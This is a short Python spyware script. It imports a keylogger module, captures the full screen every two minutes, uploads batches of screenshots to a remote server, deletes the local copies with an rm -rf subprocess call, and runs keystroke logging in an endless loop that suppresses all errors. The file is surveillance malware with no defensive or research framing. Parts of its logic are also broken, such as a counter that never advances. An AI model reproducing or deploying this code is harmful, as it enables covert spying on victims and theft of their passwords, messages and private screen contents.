import gtk.gdk
import RepeatedTimer
from time import sleep
import subprocess
from send_image import send_image
import keylogger_f

def take_screenshot(num):
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    print ("The size of the window is %d x %d" % sz)
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
    if (pb != None):
        pb.save("screenshot_"+str(num)+".png","png")

def increment(count):
    return count + 1

#delete all screenshots
def delete_sc():
    subprocess.Popen(["rm","-rf", "*.png"])

#Takes a screenshot every 2 minutes, When 500 Screenshots are reached it deletes all of them and sends them to the server. 
def initiate_screenshots():
    count = 0
    rt = RepeatedTimer.RepeatedTimer(120, take_screenshot, increment(count))
    try:
        while True:
            if count % 500 == 0:
                for i in range(count):
                    send_image("screenshot_"+str(i)+".png")
                delete_sc()
                count = 0

    finally:
        rt.stop() 

def initiate_keylogs():
    while True:
        try:
            keylogger_f.logkeys()
        except:
            pass
            